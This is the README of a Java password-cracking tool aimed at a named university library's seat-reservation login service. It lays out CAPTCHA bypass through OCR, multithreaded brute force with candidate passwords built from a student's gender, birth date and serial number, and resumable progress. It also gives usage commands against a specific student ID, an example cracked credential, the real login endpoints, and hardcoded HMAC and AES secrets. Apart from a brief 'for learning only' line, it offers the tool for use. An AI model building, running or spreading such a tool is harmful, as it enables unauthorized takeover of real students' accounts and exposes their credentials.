# HTTP Login Cracker (Java版)

基于 UJN_lib_scraper 的Java实现，用于图书馆座位系统密码爆破。

## 功能特性

- 纯Java实现 - 无需Python环境或Tesseract原生库
- ddddocr验证码识别 - 基于深度学习的纯Java OCR
- 多线程并发 - 支持自定义线程数
- 断点续传 - SQLite数据库保存进度，每50次自动保存
- 自动导出CSV - 找到密码后自动保存到文件
- HTTP超时保护 - 防止请求永久阻塞

## 项目结构

```
src/main/java/com/userzbb/
├── wordlist/
│   ├── WordlistGenerator.java    # 密码字典生成器
│   └── WordlistGeneratorTest.java
└── cracker/
    ├── HttpCracker.java          # 主程序入口
    ├── Config.java               # API配置
    ├── CryptoUtils.java          # 加密工具(AES/HMAC)
    ├── CaptchaSolver.java        # 验证码识别
    ├── HttpWorker.java           # HTTP工作线程
    ├── DatabaseManager.java      # SQLite数据库
    └── ProgressTracker.java      # 进度追踪
```

## 环境要求

- Java 11+
- Maven 3.6+

## 编译

```bash
mvn package
```

编译完成后，JAR文件位于 target/wordlist-generator-0.1.0-jar-with-dependencies.jar

## 使用方法

### 密码爆破

```bash
java -jar target/wordlist-generator-0.1.0-jar-with-dependencies.jar <username> [选项]
```

命令行参数说明：

username：必选参数，指定要测试的目标学号。

-g M/F/ALL：可选参数，指定性别筛选。M表示男生（只测试奇数序列号），F表示女生（只测试偶数序列号），ALL表示测试所有序列号。默认为ALL。

-d 日期：可选参数，指定出生日期。可以用单日期（如-d 08）、日期范围（如-d 01-15）、逗号列表（如-d 01,05,15）。默认为所有日期01-31。

-s 最大序列号：可选参数，指定最大序列号（不包含）。默认为500。例如-s 300表示测试序列号0到299。

-t 线程数：可选参数，指定并发线程数。默认为5，建议16-32以提高速度。

-o 输出文件：可选参数，指定自定义输出文件路径。

-h --help：显示帮助信息。

### 使用示例

```bash
# 基本用法 (爆破全部性别，全日期范围)
java -jar target/wordlist-generator-0.1.0-jar-with-dependencies.jar 202331223125

# 针对性爆破 (男生，08号，序列0-300)
java -jar target/wordlist-generator-0.1.0-jar-with-dependencies.jar 202331223125 -g M -d 08 -s 300

# 高性能模式 (16线程)
java -jar target/wordlist-generator-0.1.0-jar-with-dependencies.jar 202331223125 -g M -d 08 -s 500 -t 16
```

### 密码字典生成

```bash
java -cp target/wordlist-generator-0.1.0-jar-with-dependencies.jar com.userzbb.wordlist.WordlistGenerator <username> [选项]
```

## 依赖

- Apache HttpClient 5.3 - HTTP客户端
- SQLite JDBC 3.45.1.0 - 数据库
- BouncyCastle 1.70 - 加密库
- ddddocr-for-java 1.0 - OCR识别 (通过JitPack)

## 输出文件

- found_passwords.csv - 自动创建，包含找到的密码
- crack_progress.db - SQLite数据库，记录进度（可跨设备使用）

### CSV格式

```csv
username,password,found_at
202331223125,080518,2026-04-01T11:28:33
```

## 断点续传

中断程序后重新运行，会自动从上次进度继续。进度每50次自动保存到数据库。

```
[*] Resuming from: 080200
[*] Generated 2500 passwords to check
(Skipping already tested passwords...)
```

注意：Ctrl+C 中断时可能会导致 ddddocr 的 ONNX Runtime 崩溃。这是库的已知限制。建议等待进度更新后再中断，或等待程序自然结束。

## API配置

配置文件位于 src/main/java/com/userzbb/cracker/Config.java：

```java
public static final String BASE_URL = "https://seat.ujn.edu.cn";
public static final String LOGIN_API = BASE_URL + "/rest/auth";
public static final String CAPTCHA_API = BASE_URL + "/auth/createCaptcha";
public static final String HMAC_SECRET = "ujnLIB2022tsg";
public static final String AES_KEY = "server_date_time";
public static final String AES_IV = "client_date_time";
```

## 开发

### 添加新依赖

编辑 pom.xml，然后执行 mvn package。

### 运行测试

```bash
mvn test
mvn test -Dtest=WordlistGeneratorTest
```

## License

仅供学习交流使用。
